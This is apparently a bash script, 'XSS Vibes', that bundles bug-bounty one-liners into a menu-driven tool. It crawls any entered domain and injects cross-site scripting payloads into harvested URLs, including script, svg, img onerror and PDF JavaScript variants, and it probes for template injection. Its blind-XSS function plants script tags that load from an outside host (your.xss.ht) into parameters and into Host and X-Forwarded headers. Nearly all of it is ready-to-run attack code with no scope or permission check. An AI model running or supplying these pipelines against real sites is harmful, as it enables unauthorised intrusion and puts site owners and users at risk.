#!/bin/bash

# XSS Vibes - Bug Bounty OneLiners Collection
# Based on community techniques from @KingOfBugbounty, @ofjaaah, @dwisiswant0 and others

echo "🔥 XSS Vibes - OneLiners Arsenal"
echo "================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Check if required tools are installed
check_tool() {
    if command -v $1 &> /dev/null; then
        echo -e "✅ $1 is installed"
        return 0
    else
        echo -e "❌ $1 is not installed"
        return 1
    fi
}

# Tool availability check
echo "🔧 Checking tool availability..."
tools=("subfinder" "httpx" "gospider" "waybackurls" "gau" "qsreplace" "dalfox" "kxss" "gf" "hakrawler" "anew" "uro" "nuclei" "curl" "grep")

for tool in "${tools[@]}"; do
    check_tool $tool
done
echo

# Function to run XSS hunting techniques
run_gospider_xss() {
    local target=$1
    echo -e "${BLUE}🕷️ Running Gospider XSS Hunt on $target${NC}"
    
    # Technique 1: Basic gospider + dalfox
    echo "📡 Technique 1: Gospider + Dalfox"
    gospider -s "$target" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o results/gospider_dalfox.txt
    
    # Technique 2: Gospider + SVG payload
    echo "📡 Technique 2: Gospider + SVG payload"
    gospider -a -s $target -t 3 -c 100 | tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>' > results/gospider_svg.txt
    
    # Technique 3: Gospider + Script alert with verification
    echo "📡 Technique 3: Gospider + Script alert verification"
    gospider -S $target -t 3 -c 100 | tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '"><script>alert(1)</script>' | while read host; do 
        curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo -e "$host ${RED}Vulnerable${NC}"
    done > results/gospider_vulnerable.txt
}

run_wayback_xss() {
    local target=$1
    echo -e "${BLUE}🏛️ Running Wayback XSS Hunt on $target${NC}"
    
    # Technique 1: Wayback + kxss
    echo "📡 Technique 1: Wayback + kxss"
    echo $target | waybackurls | kxss > results/wayback_kxss.txt
    
    # Technique 2: Wayback + gf + httpx
    echo "📡 Technique 2: Wayback + gf + httpx"
    echo "http://$target/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew > results/wayback_gf.txt
    
    # Technique 3: Wayback + direct testing
    echo "📡 Technique 3: Wayback + direct testing"
    waybackurls $target | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do 
        curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo -e "$host ${RED}Vulnerable${NC}"
    done > results/wayback_vulnerable.txt
    
    # Technique 4: Wayback + freq analysis
    echo "📡 Technique 4: Wayback + freq analysis"
    echo http://$target | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq > results/wayback_freq.txt
}

run_hakrawler_xss() {
    local target=$1
    echo -e "${BLUE}🕸️ Running Hakrawler XSS Hunt on $target${NC}"
    
    # Advanced hakrawler technique
    hakrawler -url "$target" -plain -usewayback -wayback | grep "$target" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht > results/hakrawler_results.txt
}

run_gau_xss() {
    local target=$1
    echo -e "${BLUE}🌐 Running GAU XSS Hunt on $target${NC}"
    
    # Technique 1: GAU + gf + dalfox
    echo "📡 Technique 1: GAU + gf + dalfox"
    echo $target | gau | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | tee results/gau_targets.txt | dalfox file results/gau_targets.txt -o results/gau_dalfox.txt
    
    # Technique 2: GAU + hidden params from JavaScript
    echo "📡 Technique 2: GAU + hidden params from JavaScript"
    gau $target | egrep -v '(.css|.svg)' | while read url; do 
        vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,var,'"$url"?,g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g')
        echo -e "\e[1;33m$url\n\e[1;32m$vars"
    done > results/gau_hidden_params.txt
}

run_httpx_xss() {
    local targets_file=$1
    echo -e "${BLUE}🌍 Running HTTPX XSS Hunt on targets from $targets_file${NC}"
    
    # Advanced httpx pipeline
    httpx -l $targets_file -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/\"].*" | tr -d '[]' | anew | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/\"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" > results/httpx_pipeline.txt
}

run_nuclei_xss() {
    local target=$1
    echo -e "${BLUE}⚛️ Running Nuclei XSS scan on $target${NC}"
    
    echo $target | httpx -silent | nuclei -t ~/nuclei-templates/vulnerabilities/xss/ -o results/nuclei_xss.txt
}

run_blind_xss() {
    local target=$1
    local xss_hunter=${2:-"your.xss.ht"}
    echo -e "${BLUE}👁️ Running Blind XSS Hunt on $target${NC}"
    
    # BXSS in parameters
    echo "📡 BXSS in parameters"
    gau $target | grep "&" | head -20 | while read url; do
        curl -s "$url" -d 'test="><script src=https://'$xss_hunter'></script>' >/dev/null 2>&1
        echo "BXSS payload sent to: $url"
    done > results/blind_xss_params.txt
    
    # BXSS in headers
    echo "📡 BXSS in headers"
    echo $target | httpx -silent | while read url; do
        curl -s -L "$url" -H 'X-Forwarded-For: "><script src=https://'$xss_hunter'></script>' >/dev/null 2>&1
        curl -s -L "$url" -H 'X-Forwarded-Host: "><script src=https://'$xss_hunter'></script>' >/dev/null 2>&1
        curl -s -L "$url" -H 'Host: "><script src=https://'$xss_hunter'></script>' >/dev/null 2>&1
        echo "BXSS headers sent to: $url"
    done > results/blind_xss_headers.txt
}

run_advanced_techniques() {
    local target=$1
    echo -e "${BLUE}🔥 Running Advanced XSS Techniques on $target${NC}"
    
    # Technique 1: DOM-based XSS hunting
    echo "📡 DOM-based XSS hunting"
    gau $target | grep -E "(hash|fragment|location)" | qsreplace '"><img src=x onerror=alert(document.domain)>' > results/dom_xss.txt
    
    # Technique 2: Template injection hunting
    echo "📡 Template injection hunting"
    gau $target | grep "=" | qsreplace '{{7*7}}' | while read url; do
        response=$(curl -s "$url")
        echo "$response" | grep -q "49" && echo "Template injection possible: $url"
    done > results/template_injection.txt
    
    # Technique 3: JSONP XSS hunting
    echo "📡 JSONP XSS hunting"
    gau $target | grep -E "(callback|jsonp)" | qsreplace 'alert(1)//' > results/jsonp_xss.txt
    
    # Technique 4: PostMessage XSS hunting
    echo "📡 PostMessage XSS hunting"
    gau $target | while read url; do
        curl -s "$url" | grep -q "postMessage" && echo "PostMessage found: $url"
    done > results/postmessage_xss.txt
}

# Function to integrate with XSS Vibes payloads
integrate_xss_vibes() {
    local target=$1
    echo -e "${BLUE}🔥 Integrating with XSS Vibes GOD TIER payloads${NC}"
    
    # Test with our advanced payloads
    gau $target | grep "=" | head -10 | while read url; do
        echo "Testing $url with advanced payloads..."
        
        # Test cuneiform payload
        curl -s "${url//=*/=}𒀀='',𒉺=!𒀀+𒀀" | grep -q "𒀀" && echo "🏺 Cuneiform XSS possible: $url"
        
        # Test SVG payload  
        curl -s "${url//=*/=}<svg onload=alert(1)>" | grep -q "svg" && echo "🎨 SVG XSS possible: $url"
        
        # Test zero-width payload
        curl -s "${url//=*/=}ale‌rt(1)" | grep -q "ale" && echo "👻 Zero-width XSS possible: $url"
        
        # Test PDF XSS payload
        curl -s "${url//=*/=}%PDF-1.4%0A1%200%20obj%3C%3C/Type/Catalog/Pages%202%200%20R/OpenAction%3C%3C/Type/Action/S/JavaScript/JS(alert('XSS'))%3E%3E%3E%3E" | grep -q "PDF" && echo "📄 PDF XSS possible: $url"
        
    done > results/xss_vibes_integration.txt
}

# Main menu
show_menu() {
    echo -e "${YELLOW}🎯 Select XSS hunting technique:${NC}"
    echo "1. Gospider XSS Hunt"
    echo "2. Wayback XSS Hunt" 
    echo "3. Hakrawler XSS Hunt"
    echo "4. GAU XSS Hunt"
    echo "5. HTTPX Pipeline XSS Hunt"
    echo "6. Nuclei XSS Scan"
    echo "7. Blind XSS Hunt"
    echo "8. Advanced Techniques"
    echo "9. XSS Vibes Integration"
    echo "10. Full Comprehensive Hunt"
    echo "0. Exit"
    echo
}

# Create results directory
mkdir -p results

# Main execution
if [ $# -eq 0 ]; then
    echo "🎯 Enter target domain:"
    read target
else
    target=$1
fi

if [ -z "$target" ]; then
    echo "❌ No target specified!"
    exit 1
fi

echo -e "${GREEN}🎯 Target: $target${NC}"
echo

while true; do
    show_menu
    echo -n "Enter choice [0-10]: "
    read choice
    
    case $choice in
        1) run_gospider_xss $target ;;
        2) run_wayback_xss $target ;;
        3) run_hakrawler_xss $target ;;
        4) run_gau_xss $target ;;
        5) 
            echo "Enter path to targets file:"
            read targets_file
            run_httpx_xss $targets_file
            ;;
        6) run_nuclei_xss $target ;;
        7) 
            echo "Enter XSS Hunter domain (default: your.xss.ht):"
            read xss_hunter
            run_blind_xss $target $xss_hunter
            ;;
        8) run_advanced_techniques $target ;;
        9) integrate_xss_vibes $target ;;
        10)
            echo -e "${RED}🚀 Running FULL comprehensive hunt...${NC}"
            run_gospider_xss $target
            run_wayback_xss $target  
            run_hakrawler_xss $target
            run_gau_xss $target
            run_nuclei_xss $target
            run_blind_xss $target
            run_advanced_techniques $target
            integrate_xss_vibes $target
            echo -e "${GREEN}✅ Full hunt completed!${NC}"
            ;;
        0) 
            echo -e "${GREEN}👋 Goodbye!${NC}"
            exit 0
            ;;
        *) 
            echo -e "${RED}❌ Invalid choice!${NC}"
            ;;
    esac
    
    echo
    echo -e "${YELLOW}📊 Results saved in: ./results/${NC}"
    echo -e "${YELLOW}Press Enter to continue...${NC}"
    read
done
